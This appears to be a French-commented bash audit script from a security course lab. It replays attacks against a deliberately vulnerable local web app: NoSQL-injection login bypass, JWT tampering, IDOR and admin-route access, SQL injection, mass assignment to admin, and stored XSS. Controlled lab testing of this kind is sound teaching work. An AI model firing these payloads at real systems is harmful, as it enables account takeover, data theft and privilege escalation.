#!/usr/bin/env bash
# Script d'audit reproductible (exploitation CONTRÔLÉE).
# Rejoue les tests d'authentification, d'autorisation et d'entrées contre la
# cible de lab, et affiche pour chaque test le code HTTP et un extrait de réponse.
#
# Pré-requis : la cible doit tourner sur $BASE (défaut http://localhost:3000).
#   cd tp3/vulnerable && npm install && npm start
# Puis, dans un autre terminal :
#   bash tp2/scripts/audit.sh
set -u
BASE="${BASE:-http://localhost:3000}"
H_JSON='-H Content-Type:application/json'

echo "### Cible : $BASE"
echo

echo "== PHASE 2 — Authentification =="
echo "[2.1] Login légitime (alice)"
ALICE=$(curl -s -X POST "$BASE/api/login" $H_JSON -d '{"email":"alice@example.com","password":"alicepw"}')
echo "  réponse: $ALICE"
TOKEN_A=$(printf '%s' "$ALICE" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')

echo "[2.2] Injection NoSQL : login admin SANS mot de passe ( \$ne )"
NOSQL=$(curl -s -X POST "$BASE/api/login" $H_JSON -d '{"email":"admin@example.com","password":{"$ne":"x"}}')
echo "  réponse: $NOSQL"
TOKEN_ADMIN=$(printf '%s' "$NOSQL" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')

echo "[2.3] Décodage du JWT obtenu (header / payload)"
if [ -n "${TOKEN_ADMIN:-}" ]; then
  printf '%s' "$TOKEN_ADMIN" | cut -d. -f1 | base64 -d 2>/dev/null; echo
  printf '%s' "$TOKEN_ADMIN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
fi

echo "[2.4] Altération de la signature → le serveur doit REJETER (401)"
BAD="${TOKEN_A}tampered"
CODE=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/api/orders/101" -H "Authorization: Bearer $BAD")
echo "  HTTP $CODE (attendu 401)"
echo

echo "== PHASE 3 — Autorisation (IDOR / BOLA / escalade) =="
echo "[3.1] Alice lit SA commande #101"
curl -s -o /dev/null -w '  HTTP %{http_code}\n' "$BASE/api/orders/101" -H "Authorization: Bearer $TOKEN_A"
echo "[3.2] IDOR : Alice lit la commande de Bob #102"
curl -s -w '\n  HTTP %{http_code}\n' "$BASE/api/orders/102" -H "Authorization: Bearer $TOKEN_A"
echo "[3.3] Broken access control : Alice (user) appelle la route admin"
curl -s -o /dev/null -w '  HTTP %{http_code} (attendu 403)\n' "$BASE/api/admin/users" -H "Authorization: Bearer $TOKEN_A"
echo

echo "== PHASE 4 — Entrées utilisateur =="
echo "[4.1] Injection SQL : ' OR '1'='1"
curl -s -G "$BASE/api/users/search" --data-urlencode "email=' OR '1'='1" -w '\n  HTTP %{http_code}\n'
echo "[4.2] Mass assignment : tenter role=admin & balance=999999"
curl -s -X PUT "$BASE/api/me" -H "Authorization: Bearer $TOKEN_A" $H_JSON \
  -d '{"role":"admin","balance":999999}' -w '\n  HTTP %{http_code}\n'
echo "[4.3] XSS stocké : poster <script> puis relire /comments"
curl -s -X POST "$BASE/api/comments" $H_JSON -d '{"author":"pentester","body":"<script>alert(1)</script>"}' >/dev/null
curl -s "$BASE/comments" | grep -o '<script>alert(1)</script>' && echo "  → payload présent NON échappé (XSS)"
echo

echo "== PHASE 4bis — Configuration / fuite d'information =="
echo "[5.1] Stack trace exposée sur erreur serveur"
curl -s "$BASE/api/boom" -w '\n  HTTP %{http_code}\n'
echo "[5.2] Headers de réponse (CORS, headers de sécurité)"
curl -s -D - -o /dev/null "$BASE/comments" | grep -iE 'access-control|x-powered-by|content-security|x-frame|x-content-type|strict-transport'
